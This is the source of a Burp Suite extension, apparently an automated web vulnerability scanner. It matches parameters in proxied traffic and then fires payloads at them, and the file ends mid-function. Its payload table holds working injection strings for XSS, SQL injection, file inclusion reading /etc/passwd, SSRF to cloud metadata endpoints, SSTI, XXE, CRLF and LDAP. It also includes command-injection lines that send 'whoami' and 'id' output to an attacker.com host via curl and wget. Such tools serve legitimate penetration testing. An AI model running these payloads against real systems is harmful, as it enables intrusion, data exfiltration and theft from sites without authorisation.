# -*- coding: utf-8 -*-
"""
GF Analyzer + Smart Trigger v5.1 (Jython 2.7 / Burp Community)
- Built-in GF patterns (works out-of-the-box)
- Heuristic reflection detection with kxss-style char filtering
- Two-stage: random canary -> real payload ONLY if response changed
- STEALTH MODE: GF patterns only, zero payload emission
- Domain blacklist: auto-skips Google reCAPTCHA, analytics, CDNs, etc.
- Request deduplication: never tests (URL, param) combo twice
- Per-host rate limiting + max-request caps
- WAF detection + response stability checks
- Context-aware payload selection (JSON, XML, URL, HTML context)
- Bulletproof injection with manual fallback for URL/form/JSON/header/cookie
- Extra tabs: Baseline Changes, Smart Findings, Param Analysis, Debug Log, WAF Log
"""

from burp import (IBurpExtender, ITab, IContextMenuFactory, IHttpListener,
                  IMessageEditorController, IHttpRequestResponse, IHttpService)
from javax.swing import (JPanel, JTabbedPane, JTable, JScrollPane, JSplitPane,
                         JButton, JLabel, JTextField, JFileChooser, JOptionPane,
                         JPopupMenu, JMenuItem, SwingUtilities, ListSelectionModel,
                         BorderFactory, JToolBar, JComboBox, JToggleButton,
                         JCheckBox, JProgressBar, JTextArea, JSlider)
from javax.swing.table import DefaultTableModel
from javax.swing.event import ListSelectionListener, CaretListener, ChangeListener
from java.awt import BorderLayout, Dimension
from java.awt.datatransfer import StringSelection
from java.awt import Toolkit
from java.awt.event import MouseAdapter, ActionListener
from java.io import File, FileWriter, BufferedWriter
from java.lang import Runnable, Thread, Integer, String, System
from java.util import ArrayList, HashSet, Random, HashMap
from java.util.concurrent import Executors, TimeUnit
from java.net import URL
import re
import json
import os
import threading
import time
from datetime import datetime
from urllib import quote, unquote

# -----------------------------------------------------------------------------
# Swing helper
# -----------------------------------------------------------------------------
class SwingRun(Runnable):
    def __init__(self, func):
        self.func = func
    def run(self):
        self.func()

# -----------------------------------------------------------------------------
# Table models
# -----------------------------------------------------------------------------
class UniqueTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "URL", "Method", "Status", "Length", "Matched Params", "Hits", "Match"], 0)
    def getColumnClass(self, col):
        if col in (0, 3, 4, 6):
            return Integer
        return String

class VariantTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self, ["#", "Status", "Length", "All Params", "Match"], 0)
    def getColumnClass(self, col):
        if col in (0, 1, 2):
            return Integer
        return String

class ConfirmedTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "URL", "Method", "Vuln", "Payload", "B-Status", "P-Status",
             "B-Len", "P-Len", "Evidence", "Confidence"], 0)
    def getColumnClass(self, col):
        if col in (0, 5, 6, 7, 8):
            return Integer
        return String

class BaselineChangeTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "URL", "Method", "Parameter", "Canary", "B-Status", "C-Status",
             "B-Len", "C-Len", "Diff", "Tested"], 0)
    def getColumnClass(self, col):
        if col in (0, 5, 6, 7, 8, 9):
            return Integer
        return String

class SmartFindingTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "URL", "Method", "Parameter", "Vuln", "Confidence", "Evidence"], 0)

class ParamAnalysisTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["Parameter", "Type", "Baseline Value", "Canary Value", "Status Change", "Len Change"], 0)

class WAFLogTableModel(DefaultTableModel):
    def __init__(self):
        DefaultTableModel.__init__(self,
            ["#", "Host", "WAF Type", "Evidence", "Timestamp"], 0)

# -----------------------------------------------------------------------------
# Data holders
# -----------------------------------------------------------------------------
class TabData:
    def __init__(self, name):
        self.name = name
        self.uniques = {}
        self.unique_entries = []
        self.variant_instances = []
        self.unique_model = UniqueTableModel()
        self.unique_table = JTable(self.unique_model)
        self.unique_table.setAutoCreateRowSorter(True)
        self.unique_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.unique_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.variant_model = VariantTableModel()
        self.variant_table = JTable(self.variant_model)
        self.variant_table.setAutoCreateRowSorter(True)
        self.variant_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.variant_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.split_pane = JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                                      JScrollPane(self.unique_table),
                                      JScrollPane(self.variant_table))
        self.split_pane.setResizeWeight(0.65)

class ConfirmedTabData:
    def __init__(self, name):
        self.name = name
        self.findings = []
        self.model = ConfirmedTableModel()
        self.table = JTable(self.model)
        self.table.setAutoCreateRowSorter(True)
        self.table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.scroll = JScrollPane(self.table)

# -----------------------------------------------------------------------------
# Main extension
# -----------------------------------------------------------------------------
class BurpExtender(IBurpExtender, ITab, IContextMenuFactory, IHttpListener, IMessageEditorController):

    STATIC_EXTS = set([
        'js', 'css', 'svg', 'png', 'jpg', 'jpeg', 'gif', 'ico', 'woff', 'woff2',
        'ttf', 'eot', 'mp4', 'webm', 'pdf', 'zip', 'tar', 'gz', 'bz2', '7z',
        'bmp', 'webp', 'wav', 'mp3', 'ogg', 'm4a', 'flac', 'avi', 'mov', 'wmv',
        'exe', 'dll', 'so', 'dmg', 'pkg', 'deb', 'rpm', 'msi', 'jar', 'war', 'ear',
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'swf', 'flv', 'mkv'
    ])

    ALLOWED_PARAM_TYPES = set([0, 1, 2, 3, 4, 5, 6])

    DOMAIN_BLACKLIST = set([
        'google.com', 'www.google.com', 'accounts.google.com',
        'gstatic.com', 'fonts.gstatic.com', 'ajax.googleapis.com',
        'googleapis.com', 'googletagmanager.com', 'google-analytics.com',
        'analytics.google.com', 'doubleclick.net', 'googleadservices.com',
        'googleusercontent.com', 'youtube.com', 'youtu.be',
        'facebook.com', 'fbcdn.net', 'connect.facebook.net',
        'twitter.com', 'twimg.com', 'x.com',
        'cloudflare.com', 'cdn.cloudflare.com', 'ajax.cloudflare.com',
        'bootstrapcdn.com', 'maxcdn.bootstrapcdn.com', 'cdnjs.cloudflare.com',
        'jquery.com', 'code.jquery.com',
        'recaptcha.net', 'api.recaptcha.net',
        'hcaptcha.com', 'js.hcaptcha.com', 'api.hcaptcha.com',
        'paypal.com', 'paypalobjects.com',
        'stripe.com', 'js.stripe.com',
        'amazon.com', 'amazonaws.com', 's3.amazonaws.com',
        'microsoft.com', 'office.net', 'office365.com',
        'apple.com', 'mzstatic.com',
        'akamai.net', 'akamaized.net', 'edgekey.net',
        'fastly.net', 'fastlylb.net',
        'maps.googleapis.com', 'maps.google.com',
        'newrelic.com', 'nr-data.net',
        'hotjar.com', 'static.hotjar.com',
        'intercom.io', 'widget.intercom.io',
        'driftt.com', 'js.driftt.com',
        'segment.com', 'cdn.segment.com',
        'mixpanel.com', 'cdn.mxpnl.com',
        'amplitude.com', 'cdn.amplitude.com',
        'sentry.io', 'browser.sentry-cdn.com',
        'zendesk.com', 'static.zdassets.com',
        'hubspot.com', 'js.hs-scripts.com',
        'marketo.net', 'munchkin.marketo.net',
        'salesforce.com',
        'linkedin.com', 'platform.linkedin.com',
        'pinterest.com', 'assets.pinterest.com',
        'reddit.com', 'www.redditstatic.com',
        'tiktok.com', 'analytics.tiktok.com',
        'snapchat.com', 'sc-static.net',
        'instagram.com', 'instagramstatic-a.akamaihd.net',
        'whatsapp.net', 'static.whatsapp.net',
        'telegram.org', 'core.telegram.org',
        'discord.com', 'cdn.discordapp.com',
        'spotify.com', 'open.spotify.com',
        'netflix.com', 'assets.nflxext.com',
    ])

    BORING_PARAMS = set([
        'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content',
        'gclid', 'fbclid', 'ttclid', 'dclid', 'wbraid', 'gbraid', 'msclkid',
        'ref', 'referrer', 'source', 'medium', 'campaign', 'term', 'content',
        '_ga', '_gid', '_gat', '_gac', '__utma', '__utmb', '__utmc', '__utmz',
        'cookie_consent', 'cookieconsent', 'consent', 'gdpr', 'ccpa',
        'theme', 'color', 'lang', 'language', 'locale', 'version', 'v',
        'timestamp', 'ts', 't', '_', 'cb', 'callback', 'nocache', 'random',
        'format', 'output', 'view', 'layout', 'template', 'skin', 'style',
        'width', 'height', 'size', 'resolution', 'device', 'screen',
        'print', 'pdf', 'download', 'export', 'import', 'sort', 'order', 'dir',
        'page', 'p', 'offset', 'limit', 'rows', 'per_page', 'start', 'end',
        'from', 'to', 'since', 'until', 'before', 'after',
        'csrf_token', 'csrf', 'xsrf_token', 'xsrf', '_token', 'authenticity_token',
        'nonce', 'salt', 'checksum', 'hash', 'sig', 'signature', 'hmac',
        'sessionid', 'session_id', 'phpsessid', 'asp.net_sessionid',
        'captcha', 'recaptcha_response', 'g-recaptcha-response', 'h-captcha-response',
        '__cfduid', 'cf_clearance', 'cf-ray', '__cfruid',
    ])

    WAF_SIGNATURES = {
        'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf-browser-verification', 'Attention Required! | Cloudflare'],
        'Akamai': ['akamai', 'akamai-ghost'],
        'Incapsula': ['incapsula', 'visid_incap'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'ModSecurity': ['mod_security', 'modsecurity', 'not acceptable'],
        'AWS WAF': ['awselb', 'aws-waf', 'x-amzn-RequestId'],
        'Barracuda': ['barra'],
        'F5 ASM': ['the requested url was rejected', 'please consult with your administrator'],
        'Fortinet': ['fortigate', 'fortiweb'],
        'DataDome': ['datadome'],
        'reCAPTCHA': ['g-recaptcha', 'google.com/recaptcha', 'grecaptcha'],
    }

    XSS_CHARS = ['"', "'", "<", ">", "$", "|", "(", ")", "`", ":", ";", "{", "}", "&", "#", "%", "/"]

    TRIGGER_PAYLOADS = {
        'xss': {
            'payloads': [
                '<img+src=x+onerror=alert(1)>',
                '"><svg/onload=alert(1)>',
                "'-alert(1)-'",
                '<iframe+src="javascript:alert(1)">',
                '<body/onload=alert(1)>',
                'javascript:alert(1)',
                '"><img/src=1+onerror=alert(1)>',
                '"><body/onload=alert(1)>',
            ],
            'vuln_name': 'XSS',
            'requires_reflection': True,
        },
        'sqli': {
            'payloads': [
                "' AND (SELECT+*+FROM(SELECT(SLEEP(5)))a)AND'1'='1",
                "';WAITFOR DELAY+'0:0:5'--",
                "'||pg_sleep(5)--",
                "'+OR+'1'='1",
                "1'+ORDER+BY+9999-- ",
                "1+UNION+SELECT+null,null,null--",
                "'+AND+1=1--",
                "'+AND+1=2--",
                "1+AND+1=1",
                "1+AND+1=2",
                "' AND 1=1 --",
                "' AND 1=2 --",
            ],
            'vuln_name': 'SQLi',
            'requires_reflection': False,
        },
        'lfi': {
            'payloads': [
                '../../../../../../../../../etc/passwd',
                '....//....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                'C:\\Windows\\win.ini',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'file:///etc/passwd',
                '....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini'
            ],
            'vuln_name': 'LFI',
            'requires_reflection': False,
        },
        'idor': {
            'payloads': ['1', '2', '0', '-1', '999999', '6666', '000001'],
            'vuln_name': 'IDOR',
            'requires_reflection': False,
        },
        'redirect': {
            'payloads': [
                'https://evil.com',
                '//evil.com',
                '//evil.com/',
                '/\\evil.com',
                'https://evil.com/%2f..',
                '/%09/example.com',
                '////evil.com',
                'https:evil.com'
            ],
            'vuln_name': 'OpenRedirect',
            'requires_reflection': False,
        },
        'ssrf': {
            'payloads': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/user-data',
                'file:///etc/passwd',
                'dict://localhost:11211/',
                'gopher://localhost:9000/',
                'http://[::1]/',
                'http://0000::1/',
                'https://interact.sh',
                'http://127.0.0.1:22/',
                'http://0.0.0.0:80/'
            ],
            'vuln_name': 'SSRF',
            'requires_reflection': False,
        },
        'rce': {
            'payloads': [
                ';+id',
                '|+id',
                '`+id`',
                '$(id)',
                '${IFS}id',
                '; powershell+-c+"whoami"',
                '| whoami',
                '; curl+http://attacker.com/$(whoami)',
                '; wget+http://attacker.com/$(id)',
            ],
            'vuln_name': 'RCE',
            'requires_reflection': False,
        },
        'ssti': {
            'payloads': [
                '{{7*7}}',
                '${7*7}',
                '<%=7*7%>',
                '{{config}}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
                '{{constructor.constructor("alert(1)")()}}',
                '{{_self.env.registerUndefinedFiltersCallback("exec")}}{{_self.env.getFilter("id")}}',
                '{{""".class.mro()[2].subclasses()}}'
            ],
            'vuln_name': 'SSTI',
            'requires_reflection': False,
        },
        'nosql': {
            'payloads': [
                '{"$gt":""}',
                '{"$ne":null}',
                '{"$regex":".*"}',
                "';sleep(5000);'",
                '{"$where":"sleep(5000)"}'
            ],
            'vuln_name': 'NoSQLi',
            'requires_reflection': False,
        },
        'crlf': {
            'payloads': [
                '%0d%0aSet-Cookie:crlf=injected',
                '%0d%0aLocation:%20https://evil.com',
                '%0d%0aContent-Length:%200%0d%0a%0d%0a',
                '%0d%0aX-Injected:%20header',
                '\r\nSet-Cookie: crlf=injected',
                '\nX-Injected: header'
            ],
            'vuln_name': 'CRLF',
            'requires_reflection': False,
        },
        'xxe': {
            'payloads': [
                '<!DOCTYPE+foo+[<!ENTITY+xxe+SYSTEM+"file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE+foo+[<!ENTITY+xxe SYSTEM+"http://169.254.169.254/">]><foo>&xxe;</foo>',
                '<!DOCTYPE+foo+[<!ENTITY+xxe SYSTEM+"file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            ],
            'vuln_name': 'XXE',
            'requires_reflection': False,
        },
        'xpath': {
            'payloads': [
                "']|//*[",
                "']|//user[",
                "') or ('1'='1",
                "' or '1'='1",
                "1 or 1=1",
                "1' and 1=1 --"
            ],
            'vuln_name': 'XPath',
            'requires_reflection': False,
        },
        'ldap': {
            'payloads': [
                '*)(uid=*',
                '*)((|',
                '*)(uid=*))(&(uid=*',
                '*)(objectClass=*',
                '*)(&'
            ],
            'vuln_name': 'LDAP',
            'requires_reflection': False,
        }
    }

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName("GF + Smart Trigger v5.1")

        self.patterns = {}
        self.tabs_data = {}
        self.confirmed_tabs = {}
        self.confirmed_findings = []
        self.confirmed_counter = 0
        self.findings_counter = 0
        self.current_finding = None
        self.current_confirmed = None
        self.viewing_baseline = False
        self._populating_combo = False
        self._lock = threading.Lock()
        self.scope_patterns = []
        self.trigger_enabled = True
        self.stealth_mode = False
        self.throttle_delay = 100
        self.trigger_executor = Executors.newFixedThreadPool(2)
        self.tested_params = set()
        self.baseline_changes = []
        self.smart_findings = []
        self.param_analysis = []
        self._param_analysis_keys = set()
        self._rand = Random()
        self.waf_log = []

        self._build_ui()
        self.callbacks.addSuiteTab(self)
        self.callbacks.registerContextMenuFactory(self)
        self.callbacks.registerHttpListener(self)

        default_dir = os.path.join(System.getProperty("user.home"), ".gf")
        self.dir_field.setText(default_dir)
        self._load_and_refresh(default_dir)
        self._log("Extension loaded. Built-in patterns: %d" % len(self.patterns))
        self._log("Domain blacklist: %d domains" % len(self.DOMAIN_BLACKLIST))
        self._log("Stealth mode: OFF | Trigger: ON | Dedup: ACTIVE")

    def _build_ui(self):
        self.main_panel = JPanel(BorderLayout())
        self.main_panel.setBorder(BorderFactory.createEmptyBorder(4,4,4,4))
        toolbar = JToolBar()
        toolbar.setFloatable(False)

        toolbar.add(JLabel("GF Dir:"))
        self.dir_field = JTextField(24)
        toolbar.add(self.dir_field)
        toolbar.add(JButton("Browse", actionPerformed=self._on_browse))
        toolbar.add(JButton("Reload", actionPerformed=self._on_reload))
        toolbar.addSeparator(Dimension(8,0))

        self.scan_btn = JButton("Scan Proxy History", actionPerformed=self._on_scan)
        toolbar.add(self.scan_btn)
        import_btn = JButton("Import URLs", actionPerformed=self._on_import_urls)
        toolbar.add(import_btn)
        toolbar.add(JButton("Export CSV", actionPerformed=self._on_export))
        toolbar.add(JButton("Clear", actionPerformed=self._on_clear))
        toolbar.addSeparator(Dimension(8,0))

        toolbar.add(JLabel("Scope:"))
        self.scope_field = JTextField("*", 15)
        toolbar.add(self.scope_field)
        apply_scope = JButton("Apply", actionPerformed=self._apply_scope)
        toolbar.add(apply_scope)
        clear_scope = JButton("Clear", actionPerformed=self._clear_scope)
        toolbar.add(clear_scope)
        toolbar.addSeparator(Dimension(8,0))

        self.stealth_check = JCheckBox("Stealth (GF Only)", False)
        self.stealth_check.setToolTipText("When ON: only GF pattern matching, ZERO payloads sent")
        self.stealth_check.addActionListener(lambda e: self._set_stealth_mode())
        toolbar.add(self.stealth_check)

        self.enable_trigger_check = JCheckBox("Enable Trigger", True)
        self.enable_trigger_check.addActionListener(lambda e: self._set_trigger_enabled())
        toolbar.add(self.enable_trigger_check)
        toolbar.add(JLabel("Delay(ms):"))
        self.delay_slider = JSlider(0, 1000, 100)
        self.delay_slider.setPreferredSize(Dimension(80,20))
        self.delay_slider.addChangeListener(lambda e: self._set_throttle())
        toolbar.add(self.delay_slider)
        toolbar.addSeparator(Dimension(8,0))

        self.bl_btn = JButton("Blacklist", actionPerformed=self._show_blacklist)
        toolbar.add(self.bl_btn)
        toolbar.addSeparator(Dimension(8,0))

        self.toggle_btn = JToggleButton("View Baseline", actionPerformed=self._on_toggle)
        toolbar.add(self.toggle_btn)
        toolbar.addSeparator(Dimension(8,0))

        toolbar.add(JLabel("Jump:"))
        self.jump_combo = JComboBox()
        self.jump_combo.setPreferredSize(Dimension(120,24))
        self.jump_combo.addActionListener(self._on_jump)
        toolbar.add(self.jump_combo)
        toolbar.add(JLabel("Filter:"))
        self.filter_field = JTextField(10)
        self.filter_field.addCaretListener(self._apply_filter)
        toolbar.add(self.filter_field)

        self.main_panel.add(toolbar, BorderLayout.NORTH)

        self.main_tab_pane = JTabbedPane()
        self.main_tab_pane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT)

        self.gf_tab_pane = JTabbedPane()
        self.gf_tab_pane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT)
        self.main_tab_pane.addTab("GF Patterns", self.gf_tab_pane)

        self.baseline_change_model = BaselineChangeTableModel()
        self.baseline_change_table = JTable(self.baseline_change_model)
        self.baseline_change_table.setAutoCreateRowSorter(True)
        self.baseline_change_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.baseline_change_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.baseline_change_table.getSelectionModel().addListSelectionListener(BaselineSelectionListener(self))
        self.baseline_change_table.addMouseListener(BaselinePopupListener(self))
        self._set_table_col_widths(self.baseline_change_table, [40,400,80,120,150,80,80,80,80,80,80])
        self.baseline_change_scroll = JScrollPane(self.baseline_change_table)
        self.main_tab_pane.addTab("Baseline Changes", self.baseline_change_scroll)

        self.smart_finding_model = SmartFindingTableModel()
        self.smart_finding_table = JTable(self.smart_finding_model)
        self.smart_finding_table.setAutoCreateRowSorter(True)
        self.smart_finding_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.smart_finding_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.smart_finding_table.getSelectionModel().addListSelectionListener(SmartFindingSelectionListener(self))
        self.smart_finding_table.addMouseListener(SmartFindingPopupListener(self))
        self._set_table_col_widths(self.smart_finding_table, [40,400,80,120,100,100,300])
        self.smart_finding_scroll = JScrollPane(self.smart_finding_table)
        self.main_tab_pane.addTab("Smart Findings", self.smart_finding_scroll)

        self.param_analysis_model = ParamAnalysisTableModel()
        self.param_analysis_table = JTable(self.param_analysis_model)
        self.param_analysis_table.setAutoCreateRowSorter(True)
        self.param_analysis_table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION)
        self.param_analysis_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self.param_analysis_table.getSelectionModel().addListSelectionListener(ParamAnalysisSelectionListener(self))
        self.param_analysis_table.addMouseListener(ParamAnalysisPopupListener(self))
        self._set_table_col_widths(self.param_analysis_table, [150,100,200,200,100,100])
        self.param_analysis_scroll = JScrollPane(self.param_analysis_table)
        self.main_tab_pane.addTab("Param Analysis", self.param_analysis_scroll)

        self.waf_model = WAFLogTableModel()
        self.waf_table = JTable(self.waf_model)
        self.waf_table.setAutoCreateRowSorter(True)
        self.waf_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
        self._set_table_col_widths(self.waf_table, [40,200,120,400,120])
        self.waf_scroll = JScrollPane(self.waf_table)
        self.main_tab_pane.addTab("WAF Log", self.waf_scroll)

        self.debug_area = JTextArea()
        self.debug_area.setEditable(False)
        self.debug_area.setFont(self.debug_area.getFont().deriveFont(11.0))
        self.debug_scroll = JScrollPane(self.debug_area)
        self.main_tab_pane.addTab("Debug Log", self.debug_scroll)

        self.req_editor = self.callbacks.createMessageEditor(self, False)
        self.resp_editor = self.callbacks.createMessageEditor(self, False)
        req_wrap = JPanel(BorderLayout())
        req_wrap.setBorder(BorderFactory.createTitledBorder("Request"))
        req_wrap.add(self.req_editor.getComponent(), BorderLayout.CENTER)
        resp_wrap = JPanel(BorderLayout())
        resp_wrap.setBorder(BorderFactory.createTitledBorder("Response"))
        resp_wrap.add(self.resp_editor.getComponent(), BorderLayout.CENTER)
        bottom_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, req_wrap, resp_wrap)
        bottom_split.setResizeWeight(0.5)
        bottom_split.setPreferredSize(Dimension(0,360))

        center_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, self.main_tab_pane, bottom_split)
        center_split.setResizeWeight(0.60)
        self.main_panel.add(center_split, BorderLayout.CENTER)

        self.progress = JProgressBar()
        self.progress.setStringPainted(True)
        self.progress.setVisible(False)

        self.status = JLabel("Ready")

        south_panel = JPanel(BorderLayout())
        south_panel.add(self.progress, BorderLayout.NORTH)
        south_panel.add(self.status, BorderLayout.SOUTH)
        self.main_panel.add(south_panel, BorderLayout.SOUTH)

    def _set_table_col_widths(self, table, widths):
        cm = table.getColumnModel()
        for i, w in enumerate(widths):
            if i < cm.getColumnCount():
                cm.getColumn(i).setPreferredWidth(w)

    def _log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        line = "[%s] %s\n" % (ts, msg)
        def append():
            self.debug_area.append(line)
            self.debug_area.setCaretPosition(self.debug_area.getDocument().getLength())
        SwingUtilities.invokeLater(SwingRun(append))

    def _set_throttle(self):
        self.throttle_delay = self.delay_slider.getValue()
        self.status.setText("Throttle delay set to %d ms" % self.throttle_delay)

    def _set_stealth_mode(self):
        self.stealth_mode = self.stealth_check.isSelected()
        if self.stealth_mode:
            self.enable_trigger_check.setSelected(False)
            self.trigger_enabled = False
            self.status.setText("STEALTH MODE: GF patterns ONLY. No payloads will be sent.")
            self._log("STEALTH MODE ENABLED - All payload emission DISABLED")
        else:
            self.status.setText("Stealth mode OFF")
            self._log("Stealth mode disabled")

    def _apply_scope(self, event):
        text = self.scope_field.getText().strip()
        if text == "*" or text == "":
            self.scope_patterns = []
            self.status.setText("Scope cleared - all hosts allowed")
            return
        patterns = []
        for part in text.split(','):
            part = part.strip()
            if not part:
                continue
            negate = False
            if part.startswith('!'):
                negate = True
                part = part[1:]
            regex = re.escape(part).replace(r'\*', '.*')
            if not regex.startswith('^'):
                regex = '^' + regex
            if not regex.endswith('$'):
                regex = regex + '$'
            try:
                patterns.append((re.compile(regex, re.IGNORECASE), negate))
            except:
                pass
        self.scope_patterns = patterns
        self.status.setText("Scope applied: %d patterns" % len(patterns))

    def _clear_scope(self, event):
        self.scope_patterns = []
        self.scope_field.setText("*")
        self.status.setText("Scope cleared - all hosts allowed")

    def _is_in_scope(self, host):
        if not self.scope_patterns:
            return True
        for pat, neg in self.scope_patterns:
            if pat.match(host):
                return not neg
        return False

    def _is_blacklisted_domain(self, host):
        host_lower = host.lower()
        if host_lower in self.DOMAIN_BLACKLIST:
            return True
        for bl in self.DOMAIN_BLACKLIST:
            if host_lower == bl or host_lower.endswith('.' + bl):
                return True
        return False

    def _set_trigger_enabled(self):
        self.trigger_enabled = self.enable_trigger_check.isSelected()
        if self.trigger_enabled and self.stealth_mode:
            self.stealth_check.setSelected(False)
            self.stealth_mode = False
        self.status.setText("Trigger " + ("ENABLED" if self.trigger_enabled else "DISABLED"))

    def _show_blacklist(self, event):
        msg = "Blacklisted domains (%d total):\n\n" % len(self.DOMAIN_BLACKLIST)
        msg += "\n".join(sorted(self.DOMAIN_BLACKLIST)[:50])
        if len(self.DOMAIN_BLACKLIST) > 50:
            msg += "\n... and %d more" % (len(self.DOMAIN_BLACKLIST) - 50)
        msg += "\n\nThese domains are SKIPPED entirely to avoid testing CAPTCHA, CDNs, analytics, etc."
        JOptionPane.showMessageDialog(self.main_panel, msg, "Domain Blacklist", JOptionPane.INFORMATION_MESSAGE)

    def _on_import_urls(self, event):
        chooser = JFileChooser()
        if chooser.showOpenDialog(self.main_panel) == JFileChooser.APPROVE_OPTION:
            f = chooser.getSelectedFile()
            try:
                with open(f.getAbsolutePath(), 'r') as fp:
                    urls = [line.strip() for line in fp if line.strip().startswith('http')]
                Thread(target=lambda: self._process_imported_urls(urls)).start()
            except Exception as e:
                JOptionPane.showMessageDialog(self.main_panel, "Error: %s" % str(e))

    def _process_imported_urls(self, urls):
        count = 0
        total = len(urls)
        for url_str in urls:
            try:
                url_obj = URL(url_str)
                host = str(url_obj.getHost())
                if self._is_blacklisted_domain(host):
                    self._log("[Skip] Blacklisted domain: %s" % host)
                    continue
                protocol = "https" if url_obj.getProtocol() == "https" else "http"
                port = url_obj.getPort()
                if port == -1:
                    port = 443 if protocol == "https" else 80
                req = self.helpers.buildHttpRequest(url_obj)
                service = self.helpers.buildHttpService(url_obj.getHost(), port, protocol == "https")
                time.sleep(self.throttle_delay / 1000.0)
                resp_obj = self.callbacks.makeHttpRequest(service, req)
                if resp_obj and resp_obj.getResponse():
                    self.analyze_message(resp_obj)
                    count += 1
                if count % 10 == 0:
                    SwingUtilities.invokeLater(SwingRun(lambda c=count, t=total: self.status.setText("Imported %d/%d URLs" % (c, t))))
            except Exception as e:
                self._log("[Import] Error: %s" % str(e))
        SwingUtilities.invokeLater(SwingRun(lambda: self.status.setText("Import complete: %d/%d URLs analyzed" % (count, total))))

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            self.analyze_message(messageInfo)

    def analyze_message(self, msg):
        try:
            if msg.getResponse() is None:
                return
            req_info = self.helpers.analyzeRequest(msg)
            url = req_info.getUrl()
            host = str(url.getHost()).lower()

            if self._is_blacklisted_domain(host):
                return

            if not self._is_in_scope(host):
                return

            url_str = url.toString()
            method = req_info.getMethod()
            resp_info = self.helpers.analyzeResponse(msg.getResponse())
            status = resp_info.getStatusCode()
            length = len(msg.getResponse())

            path = str(url.getPath())
            last_seg = path.split('/')[-1]
            if '.' in last_seg:
                ext = last_seg.split('.')[-1].lower().split('?')[0].split('#')[0]
                if ext.isalpha() and len(ext) <= 6 and ext in self.STATIC_EXTS:
                    return
            mime = (resp_info.getStatedMimeType() or "") + " " + (resp_info.getInferredMimeType() or "")
            mime = mime.lower()
            static_mimes = ['image/', 'text/css', 'application/javascript', 'font/', 'video/', 'audio/']
            if any(sm in mime for sm in static_mimes):
                return

            waf = self._detect_waf(host, msg.getResponse())
            if waf:
                self._log("[WAF] %s detected on %s" % (waf, host))
                self._add_waf_log(host, waf, "Header/Body signature")

            if self._is_captcha_challenge(msg.getResponse()):
                self._log("[Skip] CAPTCHA challenge detected on %s" % host)
                return

            grep_params = []
            all_params = req_info.getParameters()
            for p in all_params:
                pt = int(p.getType())
                pname = p.getName()
                if pt in self.ALLOWED_PARAM_TYPES:
                    if pname.lower() in self.BORING_PARAMS:
                        continue
                    grep_params.append((pname, p.getValue() or "", pt, pt == 6))
            json_targets = self._extract_json_targets(msg, req_info)
            for jname, jval in json_targets:
                if jname.lower() in self.BORING_PARAMS:
                    continue
                grep_params.append((jname, jval, 6, True))
            if not grep_params:
                return

            all_param_strs = ["%s=%s" % (pname, pval) for pname, pval, _, _ in grep_params]
            full_param_values = ", ".join(all_param_strs)
            resp_body_str = self.helpers.bytesToString(msg.getResponse())

            matched_any = set()
            for name, regex_list in self.patterns.items():
                matches = []
                matched_param_names = set()
                for regex in regex_list:
                    for pname, pval, ptype, is_json in grep_params:
                        targets = [pname + "=" + pval, pname]
                        if pval:
                            targets.append(pval)
                        if is_json:
                            targets.append('"%s":"%s"' % (pname, pval))
                            targets.append('"%s":' % pname)
                        for text in targets:
                            for m in regex.finditer(text):
                                matches.append(m.group(0))
                                matched_param_names.add(pname)
                                if len(matches) >= 3:
                                    break
                            if len(matches) >= 3:
                                break
                        if len(matches) >= 3:
                            break
                    if len(matches) >= 3:
                        break
                if matches:
                    match_str = " | ".join(matches[:3])
                    matched_str = ", ".join(sorted(matched_param_names))
                    key = (host, path, method)
                    self._add_finding(name, url_str, method, status, length,
                                      matched_str, full_param_values, match_str, msg, key)
                    matched_any.update(matched_param_names)

                    if self.trigger_enabled and not self.stealth_mode:
                        for pname in matched_param_names:
                            for gp in grep_params:
                                if gp[0] == pname:
                                    if not self._dedup_can_test(host, path, pname, name):
                                        continue
                                    n = name
                                    u = url_str
                                    m = method
                                    msg_copy = msg
                                    ri = req_info
